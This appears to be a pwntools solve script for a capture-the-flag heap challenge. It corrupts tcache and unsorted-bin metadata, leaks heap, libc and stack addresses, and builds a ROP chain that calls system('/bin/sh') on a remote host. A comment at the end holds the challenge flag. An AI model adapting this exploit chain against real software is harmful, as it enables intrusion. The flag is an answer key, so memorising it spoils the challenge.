#!/usr/bin/env python3

from pwn import *

exe = ELF("./dead_or_alive_patched",checksec = False)
libc = ELF("./glibc/libc.so.6", checksec = False)
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.57.126", 42037)

    return r


def main():
    r = conn()
    input()
    def createBounty(size, description):
        r.sendlineafter(b'==> ', b'1')
        # Prepare for unsorted bin's fake chunk size
        r.sendlineafter(b': ', str(0x431).encode())
        r.sendlineafter(b': ',b'y')
        r.sendlineafter(b': ', str(size).encode())
        r.sendafter(b':\n', description)
    def removeBounty(index):
        r.sendlineafter(b'==> ', b'2')
        r.sendlineafter(b'ID: ', str(index).encode())
    def viewBounty(index):
        r.sendlineafter(b'==> ', b'3')
        r.sendlineafter(b'ID: ', str(index).encode())
    def decrypt(cipher):
        key = 0
        plain = 0
        for i in range(6):
            bits = 64 - 12*i
            if bits < 0: 
                bits = 0
            plain = ((cipher ^ key) >> bits ) << bits 
            key = plain >> 12 
        return plain
    # Create 3 chunks to modify their metadata   
    createBounty(0x30, b'A'*8)
    createBounty(0x30, b'A'*8)
    createBounty(0x30, b'A'*8)
    # Put them into tcache
    removeBounty(0)
    removeBounty(1)
    removeBounty(2)
    # pause()
    # Modify the metadata of Bounties[2] and Bounties[1]
    createBounty(0x20, b'\x01')
    ############
    # Leak heap#
    ############
    viewBounty(2)
    # pause()
    r.recvuntil(b'Description: ')
    heap_leak = u64(r.recv(6)+b'\0\0')
    info('Heap leak: ' + hex(heap_leak))
    heap_base = decrypt(heap_leak) >> 12 << 12
    info('Heap base: ' + hex(heap_base))
    # pause()
    ###########
    #Leak libc#
    ###########
    # Create some chunks to make a big fake chunks
    for i in range(7):
        createBounty(0x60, b'\0')
    # This will limits the size of fake chunk in 0x430
    createBounty(0x60, p64(0)*9 + p64(0x21))

    # pause()
    # Remove the metadata of index 2 and 1
    removeBounty(2)
    # pause()
    # Modify the metadata of chunk 1, points it to our fake chunk to prepare for free it to unsorted bin later
    createBounty(0x20, p64(heap_base + 0x470) + p64(0)*2 + p64(1))
    # pause()
    # Put our fake chunk into unsorted bin 
    removeBounty(1)
    # pause()
    # Create one more to take out Bounties[1] original 
    createBounty(0x30, b'\0')
    # Remove the description of Bounties[2], which is Bounties[1]'s metadata
    removeBounty(2)
    # Modify the metadata of Bounties[1] through Bounties[2] metadata
    createBounty(0x20, p64(heap_base + 0x470) + p64(0)*2 + p64(1))
    # Now the metadata of Bounties[1] should point to the fake chunk
    # pause()
    viewBounty(1)
    r.recvuntil(b'Description: ')
    libc_leak = u64(r.recv(6) + b'\0\0')
    libc.address = libc_leak - 0x219ce0
    info('Libc leak: ' + hex(libc_leak))
    info('Libc leak: ' + hex(libc.address))
    ############
    #Leak stack#
    ############
    removeBounty(2)
    # pause()
    createBounty(0x20, p64(libc.sym['environ']) + p64(0)*2 + p64(1))
    viewBounty(1)
    r.recvuntil(b'Description: ')
    stack_leak = u64(r.recv(6) + b'\0\0')
    info('Stack leak: ' + hex(stack_leak))
    ret_addr = ((heap_base + 0x530) >> 12) ^ (stack_leak - 0x138)
    info('Return address leak: ' + hex(ret_addr))
    # pause()
    removeBounty(10)
    # pause()
    # Fill up the metadata of Bounties[10] and description of Bounties[1]
    createBounty(0x30, b'\0')
    # pause()
    removeBounty(6)
    # pause()
    # Put out the metadata of Bounties[6]
    createBounty(0x50, b'\0')
    # pause()
    # Now we can modify the description of Bounties[6], into 
    createBounty(0x50, p64(0)*5 + p64(0x71) + p64(ret_addr) + p64(libc.sym['system']))
    # pause()
    pop_rdi = libc.address + 0x2a3e5
    binsh = next(libc.search('/bin/sh'))
    ret = libc.address + 0x29cd6
    # Malloc a chunk to overwrite the return address of create
    createBounty(0x60, b'\0')
    # pause()
    # Trigger create() to pop a shell
    createBounty(0x60, p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(libc.sym.system))
    # pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
# HTB{cLu5t3r5_m05t_w4nt3d_h4cK3r_56530f8c0946f4bbf6282b3ec35fb9e7}